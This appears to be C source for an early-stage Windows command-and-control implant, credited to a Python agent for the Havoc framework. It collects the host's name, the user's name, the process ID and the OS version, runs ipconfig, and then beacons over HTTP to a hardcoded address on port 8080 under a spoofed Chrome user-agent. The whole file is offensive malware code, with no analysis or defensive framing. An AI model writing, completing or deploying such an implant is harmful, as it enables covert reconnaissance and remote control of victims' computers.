#include <windows.h>
#include <stdio.h>
#include <wininet.h>

// Socket globals

struct AgentRegistration {
    // Credit to https://github.com/CodeXTF2/PyHmmm/blob/master/agent.py
        /* 
        # Register info:
        #   - AgentID           : int [needed]
        #   - Hostname          : CHAR [needed]
        #   - Username          : CHAR [needed]
        #   - Domain            : str [optional]
        #   - InternalIP        : str [needed]
        #   - Process Path      : str [needed]
        #   - Process Name      : str [needed]
        #   - Process ID        : DWORD [needed]
        #   - Process Parent ID : int [optional]
        #   - Process Arch      : str [needed]
        #   - OS Build          : str [needed]
        #   - OS Version        : str [needed]
        #   - OS Arch           : str [optional]
        */
    //int AgentID;
    char Hostname[260];
    char Username[260];
    //char IP[260];
    //char Domain[];
    //char Address[];
    //char Path[];
    //char Name[];
    DWORD ProcId; 
    //int ProcParentID[];
    //char ProcArch[];
    //char Build[];
    DWORD Version;
    //char OSArch[];
}Register;

struct AgentInformation {
    char *Address;
    char *UserAgent;
    int Port;
    char *Path;
}Agent;

void Registration() {
    DWORD HostnameLength = 260;
    if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
        printf("Hostname: %s \n", Register.Hostname);
    }

    DWORD UsernameBuffer = 260;
    if (GetUserNameA(Register.Username, &UsernameBuffer)) {
        printf("Username: %s \n", Register.Username);
    }

    if (Register.ProcId = GetCurrentProcessId()) {
        printf("Process ID: %lu \n", Register.ProcId);
    }

    if (Register.Version = GetVersion()) {
        printf("Host Version: %lu \n", Register.Version);
    }
    system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
}

void Init() {
    Agent.Address = "192.168.142.128";
    Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
    Agent.Port = 8080;
    Agent.Path = "/";   

    HINTERNET hInternet = InternetOpenA(Agent.UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, Agent.Address, Agent.Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", Agent.Path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            if (hRequest != NULL) {
                HttpSendRequest(hRequest, NULL, 0, NULL, 0);
            }
        }
    }
}


int main() {
    Registration();
    Init();
}